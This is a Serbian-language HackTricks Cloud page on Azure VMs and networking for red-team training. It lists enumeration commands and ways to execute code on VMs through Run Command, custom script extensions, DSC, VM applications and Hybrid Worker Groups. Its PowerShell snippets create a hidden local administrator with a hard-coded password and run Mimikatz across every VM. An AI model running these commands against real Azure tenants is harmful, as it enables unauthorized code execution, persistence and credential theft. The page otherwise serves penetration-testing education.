# Az - Virtuelne mašine i mreža

{% hint style="success" %}
Naučite i vežbajte hakovanje AWS-a:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Naučite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Osnovne informacije

[Od dokumenata:](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Azure virtuelne mašine su jedan od nekoliko tipova [resursa za računanje koji se mogu skalirati po potrebi](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree) koje Azure nudi. Obično birate virtuelnu mašinu kada vam je potrebna veća kontrola nad računarskim okruženjem nego što to nude ostale opcije. Ovaj članak pruža informacije o tome šta treba da uzmete u obzir pre nego što kreirate virtuelnu mašinu, kako je kreirate i kako je upravljate.

## Azure mrežne informacije

Azure mreže sadrže **različite entitete i načine konfigurisanja.** Možete pronaći kratke **opise,** **primere** i **komande za enumeraciju** različitih entiteta Azure mreže u:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion** nudi sigurno, potpuno upravljano rešenje za pristup preko RDP (Remote Desktop Protocol) i SSH (Secure Shell) preko SSL-a putem Azure portala. Integriran je unutar Azure virtuelne mreže, omogućavajući RDP i SSH povezivost sa VM-ovima koristeći privatne IP adrese, izbegavajući potrebu za javnim IP adresama. Ovo ga čini sigurnijom, praktičnijom alternativom tradicionalnim metodama koje uključuju dodeljivanje javnih IP adresa i konfiguracije pravila NSG za pristup VM-ovima. Razvojni inženjeri i IT osoblje mogu sigurno pristupiti VM-ovima sa Azure portala koristeći svoje web pretraživače, olakšavajući proces za razvojna i testna okruženja.

Da biste videli sve Azure Bastion Host-ove u vašoj pretplati, možete koristiti sledeću komandu:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
{% endcode %}

## Enumeracija virtuelnih mašina
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **Pokretanje komandi u virtuelnoj mašini**

### **AAD prijava u virtuelnoj mašini**

Moguće je omogućiti pristup korisnicima koji su autentifikovani putem AzureAD. Na primer, pokušavajući pristupiti **linux virtuelnoj mašini**: `ssh korisničkoime@azure-corp.com@1.1.1.1` (važno je **koristiti email** sa azurecorp koji je korišćen prilikom pokušaja prijave) možete dobiti grešku kao što je:
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Samo **pratite te instrukcije** odlaskom na [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) i navođenjem koda, koristite email i lozinku kao akreditive i bićete u mogućnosti da se povežete putem SSH-a (ako taj korisnik ima dovoljno dozvola da to uradi: `Virtual Machine Administrator Login` ili `Virtual Machine User Login` uloga).

### **Pokreni komandu**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' –Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' –Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **Pokreni proširenje prilagođenog skripta**

Proširenja virtuelne mašine (VM) u Azure-u su **male aplikacije** koje pružaju konfiguraciju nakon implementacije i automatizaciju **zadataka** na **Azure VM-ovima**. Na primer, ako virtuelna mašina zahteva instalaciju softvera, zaštitu od virusa ili mogućnost pokretanja skripta unutar nje, možete koristiti proširenje VM-a.

Stoga, ako imate pristup za pisanje, možete izvršiti proizvoljan kod:
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### ŽeljenoStanjeKonfiguracije (DSC)

ŽeljenoStanjeKonfiguracije (DSC) je alatka u PowerShell-u slična Ansible-u, korišćena za postavljanje hosta putem koda. DSC se integriše sa Azure-om, omogućavajući otpremanje specifičnih konfiguracionih fajlova. Ovi fajlovi moraju biti u skladu sa strogo definisanim sintaksom. Važno je napomenuti da DSC ekstenzija u Azure-u može izvršavati komande iz fajlova koji ispunjavaju određene kriterijume formatiranja, čak i ako sintaksa nije ispravna prema DSC standardima, kao što je prikazano na priloženoj slici.

Izvršavanje ovih komandi olakšano je kroz funkciju [**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) u Az PowerShell-u. Zahtevi uključuju **.PS1** fajl sa definisanom funkcijom i fajl mora biti zapakovan u **.zip** fajl. Iako sintaksa možda nije tačna za DSC, kod će i dalje biti izvršen. Međutim, ekstenzija će označiti status izvršavanja kao "neuspeh", i nijedan izlaz iz komande neće biti vidljiv zbog toga što je status prebrisao poruku o neuspehu.

### Definicije Aplikacija na VM-ovima

Definicije Aplikacija na VM-ovima omogućavaju ponovljivo implementiranje verzionisanih aplikacija na Azure VM-ove. Ovaj resurs podržava implementaciju i ažuriranje aplikacija na VM-ovima. Za postavljanje ovoga, potrebno je sprovesti nekoliko koraka, uključujući komande poput **`New-AzGalleryApplication`** i **`New-AzGalleryApplicationVersion`** u Az PowerShell-u.

Izvršavanje aplikacija ili komandi putem ovog metoda uključuje **"VMAppExtension"**, koji se automatski instalira kada se aplikacija primeni na VM. Ekstenzija preuzima fajl sa određenog URI-ja i naziva ga tačno kao aplikacija, bez ekstenzije. Da bi se fajl pravilno izvršio, polje "ManageActions" u REST API pozivu mora biti konfigurisano da preimenuje fajl sa odgovarajućom ekstenzijom. Postavljanje ovog metoda, kada je završeno, će ličiti na strukturu prikazanu na priloženoj slici.

Međutim, ovaj metod izvršavanja je relativno spor, potrebno je oko 3-4 minuta da se izvrši aplikacija ili komanda. Fajlovi vezani za ovaj proces se čuvaju u specifičnim direktorijumima (`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` za kopiranje aplikacije i `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\` za status izvršavanja).

Oba tehnika pružaju jedinstvene načine izvršavanja komandi i implementiranja aplikacija u Azure okruženjima, svaki sa svojim setom zahteva, koraka i razmatranja.

### Grupa Hibridnih Radnih Grupa (HWGs) u Azure-u

[**Hibridne Radne Grupe (HWGs)**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) su funkcionalnost u Azure-u koja omogućava Runbook-ove, konfigurisane u Automation Account-u, da se izvrše na Azure Virtual Machine (VM) koja je deo određene HWG. Ovo izvršavanje je olakšano kroz ekstenziju instaliranu na VM-u, koja implementira Runbook kod na VM. Značajan aspekt ovog procesa je da stvarne akreditacije nisu faktor u izvršavanju jer kod radi sa povišenim privilegijama, specifično kao **SYSTEM** ili root, kao što je ilustrovano na priloženoj slici.

Važan detalj za one koji koriste Windows 10 VM-ove je neophodnost specificiranja PowerShell verzije za Runbook. Trebalo bi postaviti da se izvršava kao PowerShell Verzija 5.1 umesto 7.1. Ovaj zahtev proizilazi iz činjenice da PowerShell 7.1 nije instaliran podrazumevano na ovim VM-ovima, što dovodi do neuspeha u izvršavanju skripta ako je specificirana verzija 7.1.

Ova funkcionalnost Azure-a nudi robustan metod za automatizaciju i upravljanje zadacima širom hibridnih okruženja, omogućavajući centralizovano upravljanje i izvršavanje zadataka na Azure VM-ovima.


## Reference

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)
